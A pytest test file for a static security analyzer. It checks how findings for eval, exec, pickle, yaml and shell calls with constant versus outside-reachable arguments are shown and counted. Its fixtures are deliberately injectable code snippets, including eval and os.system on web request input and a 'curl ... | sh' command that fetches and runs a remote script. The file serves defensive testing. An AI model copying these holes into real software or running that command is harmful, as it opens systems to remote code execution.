"""eval/exec/pickle.loads/yaml.load and shell commands whose argument every
path builds from literals carry ``low_risk_context: constant-argument``: the
raw finding and its severity stay, the default list hides it, and the gate
still counts it. Anything that could reach the argument from outside the
literals keeps the finding listed. Runs the production analyzer path."""

import json

import pytest

from skylos.analyzer import analyze
from skylos.core.gatekeeper import check_gate
from skylos.reporting.listing import is_listed

RULES = {"SKY-D201", "SKY-D202", "SKY-D203", "SKY-D205", "SKY-D206", "SKY-D209"}

DEMOTED = {
    "eval_literal": (
        "SKY-D201",
        "HIGH",
        "def total():\n    return eval('1 + 1')\n",
    ),
    "exec_local": (
        "SKY-D202",
        "HIGH",
        "def setup():\n    code = 'x = 1'\n    exec(code)\n",
    ),
    "dict_literal_key": (
        "SKY-D205",
        "CRITICAL",
        "import base64\n"
        "import pickle\n"
        "from flask import request\n"
        "def restore():\n"
        "    param = request.args.get('q', '')\n"
        "    values = {}\n"
        "    values['safe'] = 'gAN9cQAu'\n"
        "    values['user'] = param\n"
        "    bar = values['safe']\n"
        "    return pickle.loads(base64.urlsafe_b64decode(bar))\n",
    ),
    "yaml_both_branches": (
        "SKY-D206",
        "HIGH",
        "import yaml\n"
        "def settings(flag):\n"
        "    if flag:\n"
        "        text = 'a: 1'\n"
        "    else:\n"
        "        text = 'b: 2'\n"
        "    return yaml.load(text, Loader=yaml.Loader)\n",
    ),
    "shell_variable": (
        "SKY-D209",
        "HIGH",
        "import subprocess\n"
        "def status():\n"
        "    command = 'git status'\n"
        "    return subprocess.run(command, shell=True)\n",
    ),
    "system_concatenated": (
        "SKY-D203",
        "CRITICAL",
        "import os\n"
        "def status():\n"
        "    prefix = 'git '\n"
        "    command = prefix\n"
        "    command += 'status'\n"
        "    os.system(command)\n",
    ),
    "module_level_literal": (
        "SKY-D201",
        "HIGH",
        "try:\n    shell = eval('__IPYTHON__')\nexcept NameError:\n    shell = None\n",
    ),
}

LISTED = {
    "tainted_on_one_branch": (
        "SKY-D201",
        "from flask import request\n"
        "def compute(c):\n"
        "    x = '1'\n"
        "    if c:\n"
        "        x = request.args['q']\n"
        "    return eval(x)\n",
    ),
    "constant_last_match_case": (
        "SKY-D203",
        "import os\n"
        "from flask import request\n"
        "def run(mode):\n"
        "    match mode:\n"
        "        case 'a':\n"
        "            command = request.args['q']\n"
        "        case _:\n"
        "            command = 'ls'\n"
        "    os.system(command)\n",
    ),
    "guard_that_does_not_guard": (
        "SKY-D203",
        "import os\n"
        "from flask import request\n"
        "def run():\n"
        "    command = request.args['q']\n"
        "    if command:\n"
        "        pass\n"
        "    os.system(command)\n",
    ),
    "eval_alias": (
        "SKY-D201",
        "from flask import request\n"
        "e = eval\n"
        "def compute():\n"
        "    e(request.args['q'])\n"
        "    code = '1 + 1'\n"
        "    return eval(code)\n",
    ),
    "wrapper_parameter": (
        "SKY-D201",
        "def run(s):\n    return eval(s)\n",
    ),
    "parameter_default": (
        "SKY-D201",
        "def run(s='1 + 1'):\n    return eval(s)\n",
    ),
    "unknown_call": (
        "SKY-D201",
        "def run(read):\n    return eval(read())\n",
    ),
    "constant_then_tainted": (
        "SKY-D201",
        "from flask import request\n"
        "def run():\n"
        "    code = '1'\n"
        "    code = code + request.args['q']\n"
        "    return eval(code)\n",
    ),
    "container_alias": (
        "SKY-D201",
        "from flask import request\n"
        "def run():\n"
        "    parts = {'k': '1'}\n"
        "    other = parts\n"
        "    other['k'] = request.args['q']\n"
        "    return eval(parts['k'])\n",
    ),
    "item_alias": (
        "SKY-D201",
        "from flask import request\n"
        "def run():\n"
        "    parts = {'k': ['1']}\n"
        "    inner = parts['k']\n"
        "    inner.append(request.args['q'])\n"
        "    return eval(parts['k'][-1])\n",
    ),
    "loop_carried": (
        "SKY-D201",
        "def run(items):\n"
        "    code = '1'\n"
        "    for item in items:\n"
        "        eval(code)\n"
        "        code = item\n",
    ),
    "handler_after_partial_try": (
        "SKY-D201",
        "from flask import request\n"
        "def run(risky):\n"
        "    code = '1'\n"
        "    try:\n"
        "        code = request.args['q']\n"
        "        risky()\n"
        "    except Exception:\n"
        "        pass\n"
        "    return eval(code)\n",
    ),
    "closure_nonlocal": (
        "SKY-D201",
        "from flask import request\n"
        "def run():\n"
        "    code = '1'\n"
        "    def change():\n"
        "        nonlocal code\n"
        "        code = request.args['q']\n"
        "    change()\n"
        "    return eval(code)\n",
    ),
    "frame_locals_write": (
        "SKY-D201",
        "import sys\n"
        "from flask import request\n"
        "def run():\n"
        "    code = '1'\n"
        "    sys._getframe().f_locals['code'] = request.args['q']\n"
        "    return eval(code)\n",
    ),
    "module_constant_rebound": (
        "SKY-D203",
        "import os\n"
        "COMMAND = 'ls'\n"
        "def configure():\n"
        "    global COMMAND\n"
        "    COMMAND = input()\n"
        "def run():\n"
        "    os.system(COMMAND)\n",
    ),
    "module_constant": (
        "SKY-D206",
        "import yaml\n"
        "DEFAULTS = 'a: 1'\n"
        "def settings():\n"
        "    return yaml.load(DEFAULTS, Loader=yaml.Loader)\n",
    ),
    "builtins_patched": (
        "SKY-D205",
        "import builtins\n"
        "import pickle\n"
        "builtins.str = input\n"
        "def restore():\n"
        "    return pickle.loads(str(1).encode())\n",
    ),
    "frame_object_escape": (
        "SKY-D201",
        "import inspect\n"
        "def run(hook):\n"
        "    code = '1'\n"
        "    hook(inspect.currentframe())\n"
        "    return eval(code)\n",
    ),
    "code_reads_tainted_local": (
        "SKY-D201",
        "from flask import request\n"
        "def run():\n"
        "    x = request.args['q']\n"
        "    return eval('eval(x)')\n",
    ),
    "code_reads_namespace": (
        "SKY-D202",
        "import os\n"
        "from flask import request\n"
        "def handler():\n"
        "    exec('go(arg)', {'go': os.system, 'arg': request.args['q']})\n",
    ),
    "code_runs_input": (
        "SKY-D202",
        "def run():\n    exec('exec(input())')\n",
    ),
    "comparison_code": (
        "SKY-D201",
        "def run():\n    same = 'a' == 'b'\n    return eval(not same)\n",
    ),
    "attribute_value": (
        "SKY-D201",
        "class Job:\n"
        "    code = '1'\n"
        "    def run(self):\n"
        "        return eval(self.code)\n",
    ),
    "risky_constant_command": (
        "SKY-D209",
        "import subprocess\n"
        "def install():\n"
        "    command = 'curl https://x.example/i.sh | sh'\n"
        "    return subprocess.run(command, shell=True)\n",
    ),
    "expanding_constant_command": (
        "SKY-D209",
        "import subprocess\n"
        "def show():\n"
        "    command = 'echo $HOME'\n"
        "    return subprocess.run(command, shell=True)\n",
    ),
}


def _analyze(root, cases):
    (root / "pyproject.toml").write_text("[project]\nname = 'demo'\n")
    package = root / "app"
    package.mkdir()
    for name, code in cases.items():
        (package / f"{name}.py").write_text(code)
    return json.loads(
        analyze(str(root), enable_danger=True, grep_verify=False, all_advice=False)
    )


def _rows_by_case(result):
    rows = {}
    for row in result.get("danger", []):
        if row.get("rule_id") in RULES:
            stem = row["file"].replace("\\", "/").rsplit("/", 1)[-1][:-3]
            rows.setdefault(stem, []).append(row)
    return rows


@pytest.fixture(scope="module")
def analyzed(tmp_path_factory):
    cases = {name: code for name, (_, _, code) in DEMOTED.items()}
    cases.update({name: code for name, (_, code) in LISTED.items()})
    result = _analyze(tmp_path_factory.mktemp("constant_argument"), cases)
    return result, _rows_by_case(result)


@pytest.mark.parametrize("case", sorted(DEMOTED))
def test_constant_argument_is_demoted_but_kept_raw(analyzed, case):
    rule_id, severity, _ = DEMOTED[case]
    _, rows = analyzed
    [row] = [row for row in rows.get(case, []) if row["rule_id"] == rule_id]
    assert row["severity"] == severity
    assert row["low_risk_context"]["reason"] == "constant-argument"
    assert not is_listed(row, "danger")
    assert is_listed(row, "danger", explicit_rules={rule_id})


@pytest.mark.parametrize("case", sorted(LISTED))
def test_arguments_not_proved_constant_stay_listed(analyzed, case):
    rule_id, _ = LISTED[case]
    _, rows = analyzed
    matching = [row for row in rows.get(case, []) if row["rule_id"] == rule_id]
    assert matching
    for row in matching:
        assert "low_risk_context" not in row
        assert is_listed(row, "danger")


def test_gate_still_counts_demoted_constant_arguments(analyzed):
    result, rows = analyzed
    demoted = [
        row
        for case in DEMOTED
        for row in rows.get(case, [])
        if row.get("low_risk_context", {}).get("reason") == "constant-argument"
    ]
    assert demoted
    passed, _ = check_gate({"danger": demoted}, {"gate": {"max_security": 0}})
    assert passed is False
